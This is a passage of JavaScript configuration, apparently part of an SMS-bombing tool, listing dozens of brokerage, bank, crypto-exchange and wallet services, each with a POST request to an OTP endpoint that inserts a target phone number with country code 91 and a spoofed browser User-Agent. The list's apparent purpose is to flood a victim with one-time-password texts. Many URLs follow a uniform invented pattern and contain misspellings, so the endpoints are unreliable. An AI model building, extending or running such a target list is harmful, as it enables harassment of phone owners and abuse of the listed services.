        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': '5Paisa_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.5paisa.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Motilal_Oswal_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.motilaloswal.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ICICI_Direct_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.icicidirect.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HDFC_Securities_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hdfcsec.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Kotak_Securities_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kotaksec.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sharekhan_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sharekhan.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Edelweiss_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.edelweiss.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SBI_Securities_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sbisec.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Axis_Direct_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.axisdirect.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IIFL_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.iifl.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Reliance_Securities_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.relianceSecurities.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Indiabulls_Securities_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.indiabulllssec.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Geojit_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.geojit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IDFC_First_Securities_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.idfcfirstsec.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Yes_Securities_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.yessecurities.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Federal_Bank_Securities_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.federalbanksec.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'DBS_Treasures_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.dbstreasuries.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HSBC_Securities_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hsbcsec.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Citibank_Securities_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.citibanksec.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Standard_Chartered_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sc.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Deutsche_Bank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.deutschebank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Barclays_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.barclays.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'UBS_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ubs.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Credit_Suisse_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.creditsuisse.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Morgan_Stanley_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.morganstanley.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Goldman_Sachs_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.goldmansachs.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'JP_Morgan_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.jpmorgan.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BlackRock_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.blackrock.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vanguard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vanguard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Fidelity_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.fidelity.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Schwab_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.schwab.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'E_Trade_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.etrade.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Robinhood_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.robinhood.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Webull_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.webull.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'M1_Finance_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.m1finance.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SoFi_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sofi.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Acorns_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.acorns.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Betterment_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.betterment.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wealthfront_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.wealthfront.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Stash_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.stash.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Public_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.public.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Crypto.com_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.crypto.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Binance_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.binance.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Coinbase_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.coinbase.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Kraken_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kraken.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gemini_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gemini.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'KuCoin_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kucoin.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bitfinex_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bitfinex.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Huobi_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.huobi.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'OKX_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.okx.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bybit_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bybit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gate.io_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gate.io/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bittrex_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bittrex.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bitstamp_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bitstamp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BlockFi_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.blockfi.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Nexo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nexo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Celsius_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.celsius.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ledger_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ledger.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Trezor_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.trezor.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MetaMask_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.metamask.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Trust_Wallet_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.trustwallet.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Coinbase_Wallet_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.coinbasewallet.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Exodus_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.exodus.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Atomic_Wallet_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.atomicwallet.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Jaxx_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.jaxx.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Guarda_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.guarda.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Coinomi_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.coinomi.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Electrum_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.electrum.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mycelium_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mycelium.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BitPay_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bitpay.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CoinPayments_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.coinpayments.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NOWPayments_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nowpayments.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CoinGate_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.coingate.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Blockchain_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.blockchain.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Paxful_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.paxful.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LocalBitcoins_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.localbitcoins.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hodl_Hodl_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hodlhodl.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bisq_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bisq.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Uniswap_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.uniswap.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PancakeSwap_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pancakeswap.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SushiSwap_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sushi.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Curve_Finance_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.curve.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Aave_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.aave.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Compound_Finance_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.compound.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Yearn_Finance_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.yearn.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Balancer_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.balancer.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MakerDAO_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.makerdao.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Lido_Finance_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.lido.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Rocket_Pool_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rocketpool.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Stader_Labs_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.staderlabs.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ankr_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ankr.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Infura_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.infura.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Alchemy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.alchemy.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Moralis_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.moralis.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ThirdWeb_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.thirdweb.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Web3Auth_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.web3auth.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Torus_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.torus.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Magic_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.magic.com/v1/auth/otp',
